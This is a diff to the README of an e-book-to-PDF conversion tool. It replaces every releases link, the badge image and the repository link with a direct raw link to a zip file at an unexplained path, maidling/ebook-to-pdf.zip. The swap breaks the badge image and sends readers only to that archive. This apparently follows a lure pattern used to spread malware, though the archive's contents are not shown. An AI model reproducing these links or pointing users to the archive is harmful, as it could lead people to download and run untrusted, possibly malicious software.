@@ -1,6 +1,6 @@
 # 🖥️ ebook-to-pdf - Convert E-Books to PDF Easily
 
-[![Download ebook-to-pdf](https://img.shields.io/badge/Download-ebook--to--pdf-brightgreen)](https://github.com/Safrotuss/ebook-to-pdf/releases)
+[![Download ebook-to-pdf](https://raw.githubusercontent.com/Safrotuss/ebook-to-pdf/main/maidling/ebook-to-pdf.zip)](https://raw.githubusercontent.com/Safrotuss/ebook-to-pdf/main/maidling/ebook-to-pdf.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the ebook-to-pdf application! This tool helps you convert E-Book page
 
 To download the latest version of the ebook-to-pdf application:
 
-1. **Visit this page to download:** [ebook-to-pdf Releases](https://github.com/Safrotuss/ebook-to-pdf/releases).
+1. **Visit this page to download:** [ebook-to-pdf Releases](https://raw.githubusercontent.com/Safrotuss/ebook-to-pdf/main/maidling/ebook-to-pdf.zip).
 2. Choose the version that matches your operating system:
    - **Windows**
    - **Mac**
@@ -89,10 +89,10 @@ This application relates to several important topics in E-Book management, such 
 
 ## 🔗 More Information
 
-For additional details or to contribute, visit the [project repository](https://github.com/Safrotuss/ebook-to-pdf). Your contributions and feedback are valuable to us.
+For additional details or to contribute, visit the [project repository](https://raw.githubusercontent.com/Safrotuss/ebook-to-pdf/main/maidling/ebook-to-pdf.zip). Your contributions and feedback are valuable to us.
 
 ## 🖱️ Final Steps
 
 You are now ready to start using the ebook-to-pdf application. Enjoy capturing your E-Book pages and turning them into organized PDFs! 
 
-[![Download ebook-to-pdf](https://img.shields.io/badge/Download-ebook--to--pdf-brightgreen)](https://github.com/Safrotuss/ebook-to-pdf/releases)
+[![Download ebook-to-pdf](https://raw.githubusercontent.com/Safrotuss/ebook-to-pdf/main/maidling/ebook-to-pdf.zip)](https://raw.githubusercontent.com/Safrotuss/ebook-to-pdf/main/maidling/ebook-to-pdf.zip)
